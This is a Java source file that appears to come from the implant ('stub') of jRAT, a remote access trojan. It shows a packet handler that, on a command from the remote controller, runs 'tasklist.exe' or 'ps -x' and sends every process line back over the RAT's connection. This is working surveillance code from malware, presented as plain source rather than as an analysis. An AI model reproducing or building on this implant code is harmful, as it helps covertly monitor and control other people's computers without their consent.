package pro.jrat.stub.packets.incoming;

import java.io.BufferedReader;
import java.io.InputStreamReader;

import pro.jrat.common.OperatingSystem;
import pro.jrat.stub.Connection;
import pro.jrat.stub.packets.outgoing.Packet20Process;

public class Packet19ListProcesses extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		try {
			Process p = null;
			if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
				p = Runtime.getRuntime().exec("tasklist.exe /fo csv /nh");
			} else {
				p = Runtime.getRuntime().exec("ps -x");
			}

			if (p != null) {
				BufferedReader input = new BufferedReader(new InputStreamReader(p.getInputStream()));

				String line;

				while ((line = input.readLine()) != null) {
					if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
						if (line.trim().length() > 0) {
							Connection.addToSendQueue(new Packet20Process(line));
						}
					} else {
						Connection.addToSendQueue(new Packet20Process(line));
					}
				}
				input.close();
			}
		} catch (Exception err) {
			err.printStackTrace();
		}
	}

}
